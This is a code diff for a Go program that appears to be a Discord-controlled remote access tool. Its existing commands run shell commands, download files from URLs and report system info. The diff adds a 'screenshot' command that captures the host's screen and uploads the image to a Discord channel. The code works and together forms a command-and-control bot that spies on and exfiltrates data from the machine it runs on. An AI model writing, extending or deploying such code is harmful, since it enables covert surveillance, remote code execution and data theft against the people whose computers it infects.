@@ -8,8 +8,11 @@ import (
 	"os"
 	"net/http"
 	"io"
+	"bytes"
+	"image/png"
 
 	"github.com/bwmarrin/discordgo"
+	"github.com/vova616/screenshot"
 )
 
 // Variables used for command line parameters
@@ -64,7 +67,7 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 
 	if comman_items[1] == "help" {
-		_, _ = s.ChannelMessageSend(m.ChannelID, "Commands:\nhelp - Display helps\nhello - returns Hi!\ninfo - displays system info\ncmd - runs command\ndownload - downloads url to file\nver - displays version")
+		_, _ = s.ChannelMessageSend(m.ChannelID, "Commands:\nhelp - Display helps\nhello - returns Hi!\ninfo - displays system info\ncmd - runs command\ndownload - downloads url to file\nver - displays version\nscreenshot - sends a screenshot")
 	}
 
 	if comman_items[1] == "hello" {
@@ -97,6 +100,21 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 	if comman_items[1] == "ver" {
 		_, _ = s.ChannelMessageSend(m.ChannelID,a_ver)
+	}
+
+	if comman_items[1] == "screenshot" {
+		img, err := screenshot.CaptureScreen()
+
+		if(err!=nil){
+			_, _ = s.ChannelMessageSend(m.ChannelID,"ERROR")
+		}else{
+			buff := new(bytes.Buffer)
+			png.Encode(buff, img)
+			imgdat := bytes.NewReader(buff.Bytes())
+
+			s.ChannelFileSend(m.ChannelID,"screen.png",imgdat)
+		}
+
 	}
 
 }
